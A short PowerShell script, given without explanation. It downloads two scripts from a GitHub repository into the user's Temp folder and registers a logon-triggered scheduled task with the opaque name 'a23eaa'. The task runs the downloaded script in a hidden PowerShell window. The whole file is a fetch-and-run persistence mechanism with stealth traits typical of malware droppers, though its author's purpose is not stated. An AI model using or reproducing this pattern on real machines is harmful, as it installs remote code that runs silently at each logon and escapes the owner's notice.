Invoke-WebRequest -Uri "https://github.com/ethanbayliss/rads/raw/main/startup.ps1" -OutFile ($env:userprofile + "\AppData\Local\Temp\startup.ps1")
Invoke-WebRequest -Uri "https://github.com/ethanbayliss/rads/raw/main/run.ps1" -OutFile ($env:userprofile + "\AppData\Local\Temp\runrads.ps1")

$action = New-ScheduledTaskAction -Execute 'Powershell.exe' `
 -Argument '-NoProfile -WindowStyle Hidden -command "%userprofile%\AppData\Local\Temp\startup.ps1"'

$trigger =  New-ScheduledTaskTrigger -AtLogOn

Register-ScheduledTask `
 -Action $action `
 -Trigger $trigger `
 -TaskName "a23eaa"
 